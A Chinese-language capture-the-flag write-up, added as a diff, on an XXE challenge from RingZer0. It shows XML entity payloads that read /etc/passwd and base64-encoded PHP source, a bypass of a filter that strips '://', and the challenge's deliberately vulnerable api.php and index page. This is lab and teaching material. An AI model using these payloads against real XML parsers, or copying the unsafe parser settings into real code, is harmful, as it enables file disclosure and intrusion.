@@ -1,0 +1,159 @@
+
+这是一个xxe漏洞，我在绕过简单过滤的时候，走了不少弯路。
+
+基本步骤
+1.测试是否存在实体引用：
+测试用例：
+xml=<?xml version="1.0" ?> 
+<!DOCTYPE note [  
+<!ENTITY xxe   "php://filter/read=convert.base64-encode/resource=index.php" >
+]> 
+<date>%26xxe;</date>
+
+显示得到:phpfilter/read=convert.base64-encode/resource=index.php
+
+
+2. 猜测好像将:// 正则替换掉了
+老套路绕过：
+构造":://///"绕过
+
+xml=<?xml version="1.0" ?> <!DOCTYPE note [  <!ENTITY xxe   SYSTEM "file:://///etc/passwd" >]> <date>%26xxe;</date>
+即可得到flag。
+
+获取index.php api.php 
+xml=<?xml version="1.0" ?> 
+<!DOCTYPE note [  
+<!ENTITY xxe  SYSTEM "php::////filter/read=convert.base64-encode/resource=index.php" >
+]> 
+
+api.php
+<?php
+if(isset($_POST['xml'])) {
+	libxml_disable_entity_loader(false);
+	$dom = new DOMDocument('1.0');
+	$dom->loadXML(str_replace('://', '', urldecode($_POST['xml'])), LIBXML_NOENT);
+	echo $dom->textContent;
+}
+?>
+
+
+<?php
+?>
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>RingZer0 Team Online CTF Challenge</title>
+		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.2.6/jquery.js"></script>
+	</head>
+	<body>
+		<style type="text/css">
+			header {
+				background-image: url("matrix_bg.png");
+				height: 313px;
+				position: fixed;
+				width: 100%;		
+			}
+			
+			body {
+				font-family: "Trebuchet MS",Helvetica,sans-serif;
+				margin: 0;
+				background-color: #070707;
+				background-image: url("bg_texture.png");
+			}
+			
+			section {
+				font-size: 0.3cm;
+				position: relative;
+				z-index: 100;
+				background-color: #E2E2E2;
+				background-image: url("t_shadow.png");
+				background-position: center top;
+				background-repeat: repeat-x;
+				border-top: 1px solid #FFFFFF;
+				min-height: 300px;
+				width: 780px;
+				padding: 10px;
+				border-radius: 5px 5px 0 0;
+				margin: auto;
+				word-break: break-all;
+			}
+
+			.comment {
+				width: 400px;
+				text-align: left;
+				margin: auto;
+				word-break: break-all;
+			}
+			
+			.padding {
+				padding-top: 10px;
+				position: relative;
+				width: 800px;
+				margin: auto;
+				z-index: 100;
+			}
+			
+			.pre_footer {
+			    background-color: #65BE00;
+				border-top: 1px solid #D4D4D4;
+				height: 3px;
+				width: 800px;
+				margin: auto;
+			}
+			
+			footer {
+			    background-color: #F2F2F2;
+				background-image: url("t_shadow.png");
+				background-position: center top;
+				background-repeat: repeat-x;
+				border-radius: 0 0 5px 5px;
+				border-top: 1px solid #688744;
+				font-size: 0.25cm;
+				height: 25px;
+				padding-top: 10px;
+				text-align: center;
+				width: 800px;
+				margin: auto;
+			}
+			
+			.twitter {
+				color: #000000;
+				text-decoration: none;
+			}
+			
+			.twitter:hover {
+				color: #0083e6;
+			}
+		</style>
+		<header>
+		</header>
+		<div class="padding">
+			<img src="logo.png" />
+		</div>
+		<section>
+			<div class="comment">
+			<br /> <br /> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Praesent non condimentum sem. Fusce ornare dui tortor, pharetra ornare diam posuere a. Donec pulvinar eu tellus sit amet dignissim. In porttitor sapien sodales neque scelerisque, vitae euismod lectus fringilla. Sed at urna metus. Vivamus et eleifend mauris. Aenean non scelerisque eros, et consequat lectus.<br /> <br /> Curabitur porta sapien lectus, quis feugiat augue consequat sit amet. Curabitur eget condimentum augue. Nunc nulla libero, auctor ultricies risus sed, gravida vestibulum enim. Nullam non elit vitae diam ornare laoreet a nec ipsum. Maecenas viverra scelerisque elit, eget aliquet metus adipiscing ac. Fusce sollicitudin turpis diam, et ultrices lacus rhoncus consequat. Aenean vel mi tristique, gravida nisl et, congue ipsum. Morbi congue eget sapien vel elementum. Quisque luctus elit nec orci congue, quis aliquet quam facilisis. Donec eu sollicitudin lorem, id egestas odio. Proin quam ante, porttitor ac consequat eu, sollicitudin viverra orci.<br /> <br /> Nullam ornare volutpat metus id ultrices. Etiam dapibus mi a magna lobortis, ac imperdiet velit convallis. Proin ligula urna, tincidunt non nibh ut, suscipit mollis dui. Aliquam iaculis vulputate orci, eu auctor libero sodales et. Donec varius a quam eget gravida. In faucibus placerat mattis. Donec nec sodales leo. Sed ut dapibus metus.<br /> <br /> Nunc augue ipsum, tincidunt eget felis eu, posuere lacinia felis. Nunc facilisis enim sed sodales porttitor. Phasellus non nulla ultricies, tempus risus at, lacinia nibh. Phasellus eu bibendum quam. Maecenas tincidunt sapien nisl, id tempus lacus congue vitae. Phasellus volutpat mauris eget ultricies tempus. Sed at feugiat tortor. Donec eget nunc scelerisque, accumsan lectus lacinia, malesuada orci.<br /> <br /> Suspendisse et nulla nunc. Sed a sodales diam. Praesent vitae porta mauris. Nam sit amet interdum tellus, et lobortis tortor. Aliquam at lorem nec enim malesuada tempus. Integer commodo dui eros, vel ullamcorper felis posuere quis. Phasellus molestie urna iaculis sem porttitor, eu congue nibh luctus. Vivamus sagittis, diam non cursus tempor, lectus leo placerat risus, ut vestibulum risus tellus at erat. Sed lobortis convallis rhoncus. Vivamus dapibus tortor mauris, at auctor libero pretium et. 
+				<br />
+				<div class="date">
+				</div>
+			</div>
+		</section>
+		<script>
+		$(document).ready(function() {
+			$.ajax({
+				type: "POST",
+				url: "api.php?xml", 
+				data: { xml: "<date><?php echo date('r');?></date>"},
+				success: function(data) {
+					$(".date").html(data);
+				}
+			});
+		});
+		</script>
+		<div class="pre_footer">
+		</div>
+		<footer>
+			<img src="irc.png" style="margin-right: 4px"/><a href="irc://irc.smashthestack.org/" class="twitter">IRC #ringzer0team on irc.smashthestack.org</a> | <img src="twitter.png" /><a href="https://twitter.com/RingZer0_CTF" class="twitter">@RingZer0_CTF</a> | Need help? Contact us at <script>document.write(String.fromCharCode(105,110,102,111,64,114,105,110,103,122,101,114,48,116,101,97,109,46,99,111,109));</script> &copy; RingZer0 Team <?php echo date('Y'); ?>
+		</footer>
+	</body>
+</html>
